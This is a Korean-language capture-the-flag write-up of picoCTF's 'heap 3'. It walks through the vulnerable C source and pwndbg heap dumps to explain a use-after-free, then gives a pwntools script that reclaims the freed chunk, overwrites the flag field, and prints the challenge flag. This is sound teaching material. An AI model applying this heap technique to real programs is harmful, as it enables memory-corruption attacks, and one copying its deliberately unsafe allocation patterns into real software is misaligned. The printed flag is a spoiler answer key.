# [heap 3](https://play.picoctf.org/practice/challenge/440?category=6&originalEvent=73&page=1)
<br />

**Description:**
> This program mishandles memory. Can you exploit it to get the flag?
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
<br />

**Binary Protections:**
```yaml
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3fa64145c4efbd5a267e0525f58e294fba23ad2f, for GNU/Linux 3.2.0, with debug_info, not stripped

[*] '/home/kali/pico/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```
<br />
<br />

```c
void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");
```
소스코드를 보면 FLAG를 출력하기 위해서는 포인터 `x`가 가리키는 `flag`의 값을 `pico`로 덮어야 합니다. 아래 과정으로 힙을 조작 해보겠습니다.

```c
void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}
```
`alloc_object()`는 `scanf()`를 길이 제한 없이 사용하고 있으므로, 힙 버퍼오버플로우가 발생합니다. 그리고 `free_memory()`는 할당된 `x`의 청크를 해제하지만, 메모리 초기화 과정이 없습니다. 해당 청크는 `Dangling pointer`를 가리키게 되고, 이러한 문제는 `Use After Free(UAF)` 취약점을 발생하게 합니다.

<br />

```yaml
$ gdb chall -q
...
pwndbg> r
Starting program: /home/kali/pico/chall
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: ^C
Program received signal SIGINT, Interrupt.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x410 (with flag bits: 0x411)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x4056a0
Size: 0x30 (with flag bits: 0x31)
fd: 0x405

Allocated chunk | PREV_INUSE
Addr: 0x4056d0
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x405ae0
Size: 0x20520 (with flag bits: 0x20521)

pwndbg> x/10gx 0x4056a0
0x4056a0:       0x0000000000000000      0x0000000000000031
0x4056b0:       0x0000000000000405      0xce80e67edbc3fca1
0x4056c0:       0x0000000000000000      0x6962000000000000
0x4056d0:       0x0000000000006f63      0x0000000000000411
0x4056e0:       0x0000000000000a35      0x0000000000000000

pwndbg> x/x 0x4056ce
0x4056ce:       0x000000006f636962
pwndbg> x/s 0x4056ce
0x4056ce:       "bico"
```
위 결과는 `x`가 청크를 해제하고, heap 명령어를 통해 출력된 결과입니다. 해제된 청크 `0x4056a0`에는 `0x4056ce` 위치에 `bico`가 저장되어 있는 것을 알 수 있습니다. 다음은 UAF가 발생하면 힙이 어떻게 되는지 보겠습니다.

<br />

```yaml
$ gdb chall -q
...
pwndbg> r
Starting program: /home/kali/pico/chall
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: AAAAAAAA

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: ^C
Program received signal SIGINT, Interrupt.

pwndbg> heap
Allocated chunk | PREV_INUSE  
Addr: 0x405000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x4056a0
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x4056d0
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x405ae0
Size: 0x20520 (with flag bits: 0x20521)

pwndbg> x/10gx 0x4056a0
0x4056a0:       0x0000000000000000      0x0000000000000031
0x4056b0:       0x4141414141414141      0x0000000000000000
0x4056c0:       0x0000000000000000      0x6962000000000000
0x4056d0:       0x0000000000006f63      0x0000000000000411
0x4056e0:       0x4141414141414141      0x000000000000000a
```
위 결과는 `x`의 청크를 해제하고, 같은 크기의 메모리를 새로 할당한 뒤의 heap 정보를 출력한 결과입니다. 해제된 청크였던 `0x4056a0`가 할당되어 있고, 내부에는 `0x4141414141414141`이 덮혀진 것을 알 수 있습니다. 이 취약점으로 `flag`의 데이터를 조작할 수 있습니다.

> [!NOTE]
> 구조체 `object`의 크기는 `a`~`flag`까지 총 35바이트입니다. 새로 할당하는 메모리의 크기도 35바이트여야 `x`의 청크를 재할당할 수 있습니다.

<br />

> [!important]
> `ptmalloc`은 힙을 효율적으로 관리하기 위해 설계되었고, 해제된 청크를 관리하는 bin(fastbin, smallbin, unsorted bin 등)이 존재합니다. `free()`를 통해 청크가 해제되면 해당 크기에 맞는 bin에 들어가게 됩니다. 이후 새로운 할당 요청이 들어오면, `ptmalloc`은 우선적으로 bin에서 같거나, 비슷한 크기의 청크를 찾아 재할당합니다.
>
> 본 문제처럼 청크를 해제한 뒤, 초기화를 하지 않으면 여전히 해제된 메모리를 가리키는 `Dangling pointer`가 됩니다. 이후 같은 크기의 메모리 요청이 발생하면 해제된 청크가 재사용되며, `Dangling pointer`를 통해 접근할 경우 새로 할당된 메모리를 침범하게 됩니다. 이로 인해 UAF 취약점이 발생할 수 있으며, 내부 데이터 유출이나 메모리 변조로 이어질 수 있습니다.

<br />

```yaml
pwndbg> p/x 0x4056ce - 0x4056b0
$1 = 0x1e
```
`a`에서부터 `flag`까지의 거리는 `0x1e` 이며, `pico`를 더해서 입력하면 `check_win()`의 조건이 충족되어 FLAG가 출력될 것입니다. 위에서 얻은 정보로 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"

p = remote("tethys.picoctf.net", 61851)

def create(size, data):
    p.sendlineafter(b":", b"2")
    p.sendlineafter(b":", size)
    p.sendlineafter(b":", data)

def free():
    p.sendlineafter(b":", b"5")

def win():
    p.sendlineafter(b":", b"4")


free()
create(b"35", b"A"*0x1e+b"pico")
win()

p.interactive()
```
```bash
$ python3 test.py
YOU WIN!!11!!
picoCTF{now_thats_free_real_estate_e8938a97}
$
```
